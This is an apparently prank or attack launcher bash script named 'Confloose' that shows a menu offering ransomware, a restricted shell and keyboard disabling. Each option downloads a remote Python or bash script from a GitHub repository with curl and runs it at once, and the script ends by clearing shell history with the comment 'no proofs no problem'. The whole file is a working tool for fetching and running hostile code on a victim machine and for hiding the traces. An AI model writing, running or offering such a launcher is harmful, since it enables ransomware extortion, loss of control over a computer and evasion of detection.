#!/bin/bash

function gui() {
    banner=""" __   __        ___       __   ___
 /  \` /  \\ |\ | |__  |    /__\` |__
 \__, \__/ | \| |    |___ .__/ |___  """
    echo "$banner"
    echo "-------"
    echo -e "\033[0;31m[0]\033[0m ransomware"
    echo -e "\033[0;31m[1]\033[0m restricted shell"
    echo -e "\033[0;31m[2]\033[0m disable keyboard"
    echo -e "\033[0;31m[3]\033[0m exit"

    echo "-------"
    read -p $'\033[1;35mHow do you want to confloose? \033[0m' choice
    confloose "$choice"
}

function confloose() {
    if [ "$1" == "0" ] || [ "$1" == "ransom" ] || [ "$1" == "-r" ]; then
        # ransomware
        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.py")
    elif [ "$1" == "1" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
        # restricted_shell
        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/restricted_shell.py")
    elif [ "$1" == "2" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
         # onlymouse
         bash <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/onlymouse.sh")
    elif [ "$1" == "3" ]; then
        exit
    else
        echo -e "\033[0;31mInvalid arg\033[0m"
    fi
}

if [ "$#" -eq 1 ]; then
    confloose "$1"
else
    gui
fi

history -c # no proofs no problem 👀
